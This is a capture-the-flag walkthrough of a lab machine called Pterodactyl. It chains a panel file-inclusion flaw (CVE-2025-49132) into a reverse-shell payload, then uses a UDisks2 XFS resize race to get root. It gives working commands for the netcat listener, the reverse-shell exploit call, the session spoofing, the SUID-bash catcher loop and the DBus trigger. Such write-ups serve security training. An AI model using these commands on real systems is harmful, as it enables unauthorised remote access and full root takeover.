Pterodactyl - From Remote Access to Root Control

Description: A comprehensive walkthrough detailing the chain from a critical RCE vulnerability (CVE-2025-49132) on a management panel to a sophisticated UDisks2 Race Condition for full Root access.

1. Initial Access: The Pterodactyl Panel RCE (CVE-2025-49132)

Our reconnaissance revealed that the target's management panel, Pterodactyl, was running an outdated version (< 1.11.11). This specific version is critical due to a flaw in its locale management that enables Local File Inclusion (LFI). This LFI can be leveraged to trigger the pearcmd tool, achieving Remote Code Execution.

Attack Flow:

  • Poisoning: Abuse the LFI to create a malicious PHP file: /tmp/payload.php.
  • Payload: We inject a dynamic Base64-encoded Bash reverse shell into the PHP file using the system() function.
  • Execution: Perform a second request via the LFI to include and execute the newly created temporary payload.
# Terminal 1 (Setup Listener)
nc -lvnp 4444

# Terminal 2 (Execute Exploit)
python3 exp.py -t panel.pterodactyl.htb -l [YOUR_VPN_TUN0_IP] -p 4444

# PoC Output:
[*] Target: panel.pterodactyl.htb
[*] LHOST: 10.10.14.57 (adjust to yours)
[*] Uploading payload via pearcmd...
[+] Locale poison successful: /tmp/payload.php created.
[*] Triggering payload... check Terminal 1!

After upgrading our newly obtained shell, we pivot from the web user to the machine's actual user, phileasfogg3.

2. Privilege Escalation: Exploiting the UDisks2 Race Condition

Enumeration inside the system as phileasfogg3 identified **UDisks2**, a system service that allows unprivileged users to manage storage devices. A significant vulnerability exists during filesystem resizing operations (specifically XFS): a small time window occurs where UDisks mounts the device with permissive permissions.

Setup & Preparation:

# Step 1: Force an active session state by mimicking PAM variables.
# UDisksctl requires an active session detected by logind.
echo -e "XDG_SEAT=seat0\nXDG_VTNR=1" > ~/.pam_environment
exit # Re-connect via SSH

# Verify active session state
loginctl show-session $(loginctl | grep $(whoami) | awk '{print $1}') | grep Active
Active=yes

The Exploitation Window:

We prepare a specialized XFS image (xfs.img) containing a SUID-enabled bash binary. We transfer this image to the victim's /tmp.

# Step A: Map the malicious XFS image as a loop device
udisksctl loop-setup -f /tmp/xfs.img
# Output: Mapped file /tmp/xfs.img as /dev/loop0

# Step B: Launch the "Catcher" (or Sniper) in the background.
# This aggressive loop immediately finds the temporary mount point and
# executes the SUID bash inside it to create a persistent root shell.
(while true; do ls -d /tmp/blockdev.* 2>/dev/null | while read d; do "$d"/bash -p -c 'cp /usr/bin/bash /tmp/rb; chmod 4755 /tmp/rb' 2>/dev/null; done; done) &

# Step C: Trigger the UDisks2 vulnerability via DBus.
# This call forces UDisks to mount the malicious device briefly to resize it.
busctl call org.freedesktop.UDisks2 /org/freedesktop/UDisks2/block_devices/loop0 \
org.freedesktop.UDisks2.Filesystem Resize "ta{sv}" 0 0
Race Condition Explained: The attack relies on winning a "race." When busctl triggers the resize, UDisks2 mounts the XFS image under /tmp/blockdev.XXXXXX. Our background loop ("Step B") must execute the internal SUID shell during the brief moment *after* the mount occurs but *before* the operation completes and UDisks removes the directory.

3. Victory (Root Flag Retrieval)

Winning the race results in a persistent root binary located at /tmp/rb, owned by root with the SUID bit set.
